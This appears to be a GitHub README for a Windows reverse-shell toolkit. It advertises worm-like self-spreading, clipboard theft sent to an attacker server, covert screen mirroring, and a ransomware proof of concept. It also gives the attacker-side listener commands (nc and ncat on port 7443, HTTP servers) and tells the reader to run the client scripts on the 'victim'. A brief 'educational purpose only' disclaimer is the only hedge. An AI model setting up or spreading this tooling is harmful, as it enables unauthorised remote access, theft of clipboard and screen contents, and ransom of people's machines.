# Reverseshell mixed with Personnal Command 
EDUCATIONAL PURPOSE ONLY and IF YOU HAVE PERMISSION

Intergrated Commandes
-Worm itr self( new port and create child process) # TODO Make the Process independant
-ClippyON ClippyOFF Send the clipboard to a server as POST Server Need to be ON( sudo python3 ServerHttp_Content.py 80 ) For exemple
-CreapyON CreapyOFF Screen Mirror to the attacker machine // Kali needs to pip3 install ssm 
![image](https://user-images.githubusercontent.com/26183588/212199897-2bc19bb8-13c0-4931-838b-6f2d57eb5789.png)
-Ransom  Is for the Ransom -> DO NOT USE IT IS A POC ONLY


sudo python3 ServerHttp_Content.py 80 -> Clippy
nc --ssl -lvnp 7443 -> SSL Shell
python3 -m http.server 9090 -> FileServer to Upload and Download
![image](https://user-images.githubusercontent.com/26183588/212199470-58963b23-b821-4d47-909e-50fd790731ba.png)
python3 ServerScreenShoot.py --> Creapy // SCreen Mirroring


![image](https://user-images.githubusercontent.com/26183588/212199608-0a3a253f-01fe-4f9a-8d29-1fbc14001be7.png)


usage
victim
python revshell_client_win.py # change the IP and PORT
Kali
nc -lvnp 7443



victim
python revshell_client_win_ssl.py # change the IP and PORT
Kali
ncat --ssl -lvp 7443 
![image](https://user-images.githubusercontent.com/26183588/211539028-d1a362db-4ed9-45aa-9b22-4668173c1719.png)
